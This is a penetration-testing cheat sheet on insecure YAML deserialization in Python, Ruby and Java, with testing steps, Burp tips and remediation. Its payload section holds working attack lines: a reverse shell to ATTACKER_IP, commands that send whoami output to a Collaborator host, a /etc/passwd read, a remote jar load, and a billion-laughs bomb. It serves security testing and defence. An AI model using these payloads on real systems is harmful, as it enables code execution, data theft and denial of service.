# YAML Deserialization / Insecure YAML Loading

## Overview
YAML parsers in multiple languages support deserializing complex objects including arbitrary class instances. When `yaml.load()` (or equivalent unsafe functions) is called with untrusted YAML input, an attacker can include YAML tags that instantiate arbitrary classes and trigger code execution or SSRF. This affects Python (PyYAML), Ruby (Psych), Java (SnakeYAML), and others.

## How It Works
- **Python PyYAML**: `yaml.load(untrusted_data)` with no `Loader` argument (pre-6.0) or `Loader=yaml.Loader` / `yaml.UnsafeLoader` allows instantiating arbitrary Python objects via `!!python/object/apply:os.system ["id"]`.
- **Ruby Psych**: `YAML.load(untrusted)` can deserialize Ruby objects including `Gem::StubSpecification` for RCE.
- **Java SnakeYAML**: `new Yaml().load(untrusted)` can trigger class loading via Spring/SPI, leading to SSRF or RCE.
- **Go (go-yaml)**: `yaml.Unmarshal` into `interface{}` is generally safe but can cause issues with specific struct tags.

## Impact
- Remote Code Execution via arbitrary class instantiation.
- SSRF via URL-fetching class instantiation (SnakeYAML SPI).
- File read via class constructors that open files.
- Denial of Service via billion-laughs YAML bomb.

## Where to Look
- Configuration upload endpoints that accept YAML.
- API parameters accepting YAML content.
- Infrastructure-as-code import features (CI/CD, Kubernetes manifest upload).
- `Content-Type: application/yaml` or `text/yaml` endpoints.
- Applications that serialize/deserialize YAML session data.

## Testing Steps
1. Identify endpoints that accept YAML content (by content-type, file extension, or parameter name).
2. Test if the YAML parser is using an unsafe loader:
   - Submit a YAML bomb (DoS) first: `{a: &a [*a]}` — if the server hangs, YAML is being parsed.
3. Test Python object instantiation payload.
4. Test Java SnakeYAML SSRF via URL fetch.
5. Test Ruby Psych RCE for Ruby applications.
6. Use OOB callback for blind confirmation.

## Payloads / Techniques
```yaml
# Python PyYAML RCE (os.system)
!!python/object/apply:os.system ["id > /tmp/pwned"]

# Python PyYAML reverse shell
!!python/object/apply:subprocess.check_output
  - ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]

# Python PyYAML OOB DNS (blind)
!!python/object/apply:os.system 
  ["curl http://COLLABORATOR.burpcollaborator.net/$(whoami)"]

# Python - read file contents
!!python/object/apply:open
  - /etc/passwd
  - r

# Java SnakeYAML SSRF (via javax.script.ScriptEngineManager)
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://ATTACKER_SERVER/yaml-payload.jar"]
  ]]
]

# YAML Billion Laughs (DoS) - for detection only
a: &a ["lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c]
e: [*d,*d,*d,*d,*d,*d]
```

```bash
# Send PyYAML RCE payload
curl -s -X POST https://target.com/api/config/upload \
  -H "Content-Type: application/x-yaml" \
  --data-binary '!!python/object/apply:os.system ["curl http://COLLABORATOR.burpcollaborator.net/$(whoami|base64)"]'

# Send as JSON field containing YAML
curl -s -X POST https://target.com/api/import \
  -H "Content-Type: application/json" \
  -d '{"config": "!!python/object/apply:os.system [\"id\"]"}'
```

## Burp Suite Tips
- Send YAML payloads in **Repeater** to any endpoint accepting YAML content types.
- Use **Burp Collaborator** to capture OOB interactions for blind confirmation.
- Fuzz YAML content-type endpoints identified in **Proxy History**.

## Tools
- pyyaml-exploit — https://github.com/EddieIvan01/pyyaml-exploit
- yaml-payload — https://github.com/artsploit/yaml-payload (for SnakeYAML)
- Burp Collaborator for OOB

## Remediation
- **Python**: Always use `yaml.safe_load()` instead of `yaml.load()`. Never pass `Loader=yaml.Loader` or `Loader=yaml.UnsafeLoader`.
- **Ruby**: Use `YAML.safe_load()` instead of `YAML.load()`. Whitelist permitted classes.
- **Java**: Prefer `SafeConstructor` with SnakeYAML or use a JSON library instead.
- Validate and sanitize all YAML input before parsing.
- Run YAML parsers in a sandbox with restricted system access.
- Consider rejecting YAML from untrusted sources entirely — use JSON instead.

## References
https://portswigger.net/web-security/deserialization
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://pyyaml.org/wiki/PyYAMLDocumentation
https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/
